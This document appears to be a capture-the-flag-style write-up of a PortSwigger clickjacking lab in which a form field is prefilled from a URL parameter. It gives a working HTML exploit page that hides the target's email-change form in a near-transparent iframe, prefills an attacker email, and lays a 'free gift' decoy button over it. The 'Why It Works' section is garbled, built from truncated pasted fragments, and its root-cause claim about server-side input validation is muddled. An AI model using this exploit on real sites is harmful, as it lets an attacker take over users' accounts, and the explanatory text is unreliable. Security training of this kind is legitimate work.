# Clickjacking with form input data prefilled from a URL parameter

### Goal -

Exploit a clickjacking vulnerability where form fields can be prefilled from URL parameters, allowing the attacker to pre-fill malicious values and trick the user into submitting them.

### Exploitation

1. Identify URL parameters that pre-fill form fields on the target page
2. Create an HTML page with a transparent iframe pointing to the target URL with pre-filled malicious values
3. Overlay deceptive UI elements (e.g., a fake "Click here for a prize" button) on top of the invisible form submit button
4. When the user clicks the deceptive button, they actually click the form's submit button in the iframe
5. The form submits with the attacker-controlled pre-filled values

Example exploit page:
```html
<style>
    iframe {
        position: relative;
        width: 500px;
        height: 300px;
        opacity: 0.1;
        z-index: 2;
    }
    .decoy {
        position: absolute;
        top: 50px;
        left: 50px;
        z-index: 1;
    }
</style>
<div class="decoy">
    <h3>Click here for a free gift!</h3>
    <button>Claim Now</button>
</div>
<iframe src="https://TARGET.net/update-email?email=attacker@evil.com"></iframe>
```

### Why It Works

The exploit succeeds because this lab extends the basic clickjacking example in lab: basic clickjacking with csrf token protection. the goal of the lab is to change the email address of the user by prepopulating a form using a ur

The official solution confirms: Log in to the account on the target website. Go to the exploit server and paste the following HTML template into the "Body" section: &lt;style&gt; ifr

The root cause is a failure in the application's security architecture specific to this clickjacking scenario — the server does not properly validate or secure the user-controlled input that reaches the vulnerable operation.

### Key Takeaways

- The vulnerability is exploitable because user input reaches a sensitive operation without adequate server-side validation.
- PortSwigger confirms: "This lab extends the basic clickjacking example in Lab: Basic clickjacking with CSRF token protectio"
- Set X-Frame-Options or CSP frame-ancestors — JavaScript frame-busting is bypassable.
